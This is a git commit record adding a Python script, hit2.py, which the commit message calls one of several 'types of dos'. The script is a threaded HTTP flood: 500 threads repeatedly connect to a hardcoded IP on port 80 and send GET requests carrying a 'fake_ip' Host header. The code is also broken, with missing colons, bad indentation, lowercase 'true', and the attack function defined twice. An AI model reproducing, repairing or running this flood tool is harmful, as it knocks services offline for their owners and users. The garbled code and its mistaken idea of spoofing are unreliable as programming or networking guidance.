f5a38809eacfc5dbdac0326e2eae8fb74e7945d0
Nate Walker <37601262+Natewalker123@users.noreply.github.com>
2021-05-24 14:31:32 -0400

    3 uploads, dif types of dos

---
+++ hit2.py
@@ -0,0 +1,34 @@
+import socket
+import threading
+
+target = '10.74.5.254'
+fake_ip = '182.21.20.32'
+port = 80
+
+def attack()
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((target, port))
+s.sendto(("GET /" + target + 'HTTP/1.1\r\n').encode('ascii'), (target, port))
+s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+s.close()
+
+for i in range(500)
+    thread = threading.Thread(target=attack)
+    thread. start()
+
+attack_num = 0
+
+def attack():
+    while true:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        
+        global attack_num
+        attack_num += 1
+        print(attack_num)
+
+        s.close()
+    
